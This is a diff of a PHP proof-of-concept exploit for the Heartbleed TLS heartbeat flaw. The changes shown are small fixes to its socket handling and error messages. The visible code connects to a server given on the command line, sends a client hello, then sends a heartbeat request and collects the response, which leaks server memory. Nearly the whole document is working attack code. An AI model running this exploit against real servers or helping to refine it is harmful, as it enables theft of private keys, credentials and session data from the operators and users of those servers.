@@ -12,7 +12,7 @@
 echo "--------PHP Heartbleed POC ---------------\n\n";
 ob_start();
 if( 1 == $argc )
-	exit("Usage: \"php ssltest.php url.com 443\"");
+	exit("Usage: \"php ssltest.php url.com 443\"\n");
 array_shift($argv);
 $data = array(
 		$argv[0],
@@ -78,9 +78,9 @@ function recvall($length, $timeout = 5) {
 			return null;
 		$e = NULL;
 		$r = array($s);
-		socket_select( $r, $w, $e, 5);
+		@socket_select( $r, $w, $e, 5);
 		if( in_array($s, $r) ) {
-			$d = socket_recv($s, $data, $remain, 0 );
+			$d = @socket_recv($s, $data, $remain, 0 );
 			if( false == $data )
 				return null;
 			$rdata .= $data;
@@ -130,21 +130,21 @@ function hit_hb() {
 	}
 }
 echo "Connecting to socket...\n";
-$s = socket_connect( $s, $data[0], $data[1] );
+$s_ = socket_connect( $s, $data[0], (int) $data[1] );
 if( ! $s )
-	exit("Error [". socket_last_error() . "]: " . socket_strerror( socket_last_error() ) );
+	exit("Error [". socket_last_error() . "]: " . socket_strerror( socket_last_error() ) . "\n" );
 echo "Sending client hello...\n";
-socket_send($s, $hello, strlen($hello), 0 );
+@socket_send($s, $hello, strlen($hello), 0 );
 ob_flush();
 while( true ) {
 	list($typ, $ver, $pay) = recvmsg();
 	if( null == $typ )
-		exit('Server closed conection without sending hello!');
+		exit("Server closed conection without sending hello!\n");
 
 	if( 22 == $typ && ord($pay[0]) == 0x0E )
 		break;
 }
 echo "Sending heartbeat request...\n";
 ob_flush();
-socket_send($s, $hb, strlen($hb), 0);
+@socket_send($s, $hb, strlen($hb), 0);
 hit_hb();
